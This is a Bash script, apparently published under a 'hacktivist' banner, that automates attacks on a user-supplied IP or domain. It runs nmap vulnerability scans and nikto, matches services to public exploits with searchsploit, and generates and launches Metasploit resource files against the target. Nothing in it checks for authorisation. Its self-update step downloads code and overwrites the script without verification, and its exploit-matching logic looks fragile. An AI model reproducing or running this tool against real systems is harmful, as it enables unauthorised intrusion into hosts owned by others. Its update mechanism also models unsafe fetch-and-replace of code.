#!/bin/bash

# Fungsi Banner
Banner() {
    clear
    echo "====================================="
    echo " Auto Exploit Scanner by bcevm-hacktivist Indonesia "
    echo "====================================="
}

# Cek Update
Cek_Update() {
    echo "[+] Mengecek update..."
    repo_version_url="https://raw.githubusercontent.com/BCEVM/Xploit/main/version.txt"
    local_version="1.0"
    latest_version=$(curl -sL "$repo_version_url" | head -n 1)

    if [[ "$local_version" != "$latest_version" ]]; then
        echo "[!] Versi terbaru tersedia: $latest_version"
        echo "[+] Gunakan perintah './exploit --update' untuk memperbarui."
        exit 1
    fi
}

# Fungsi Update
Fungsi_Update() {
    if [[ "$1" == "--update" ]]; then
        echo "[+] Mengunduh versi terbaru..."
        repo_url="https://raw.githubusercontent.com/BCEVM/Xploit/main/exploit"
        curl -sL "$repo_url" -o exploit_update.sh
        mv exploit_update.sh "$0"
        chmod +x "$0"
        echo "[+] Update selesai. Jalankan ulang script."
        exit 0
    fi
}

# Scan dengan Nmap
Scan_Nmap() {
    echo "[+] Scanning target dengan Nmap..."
    nmap -p- -sV --script=vuln -T4 -oN nmap_scan.txt "$target"
}

# Cek Layanan Web dengan Nikto
Cek_Nikto() {
    if grep -qE "80|443|8080|8443" <<< "$open_ports"; then
        echo "[+] Menjalankan Nikto..."
        nikto -h "$target" -o nikto_scan.txt
        echo "[+] Hasil Nikto disimpan di nikto_scan.txt"
    fi
}

# Mengeksekusi Exploit
Eksekusi_Exploit() {
    echo "[+] Mencari exploit yang cocok..."
    for port in $open_ports; do
        service=$(grep -A 1 "$port/open" nmap_scan.txt | grep "Service Info:" | awk -F': ' '{print $2}')
        if [[ -n "$service" ]]; then
            exploit=$(searchsploit "$service" | grep -v "Exploits: No Results" | head -n 1)
            if [[ -n "$exploit" ]]; then
                echo "[+] Exploit tersedia untuk $service di port $port"
                echo "$exploit"
                
                exploit_path=$(searchsploit -m "$service" | awk '{print $NF}')
                if [[ -f "$exploit_path" ]]; then
                    echo "use $exploit_path" > metasploit.rc
                    echo "set RHOSTS $target" >> metasploit.rc
                    echo "set RPORT $port" >> metasploit.rc
                    echo "exploit" >> metasploit.rc
                    msfconsole -q -r metasploit.rc
                else
                    echo "[-] Exploit tidak valid atau tidak ditemukan di Metasploit."
                fi
            fi
        fi
    done
    echo "[+] Proses selesai."
}

# Main Script
main() {
    Banner
    Cek_Update
    Fungsi_Update "$1"
    
    read -p "Masukkan target IP/domain: " target
    Scan_Nmap
    echo "[+] Mengecek hasil scanning..."
    open_ports=$(grep "open" nmap_scan.txt | awk -F'/' '{print $1}')
    
    if [[ -z "$open_ports" ]]; then
        echo "[-] Tidak ada port terbuka. Keluar..."
        exit 1
    fi
    
    echo "[+] Port terbuka: $open_ports"
    Cek_Nikto
    Eksekusi_Exploit
}

main "$1"
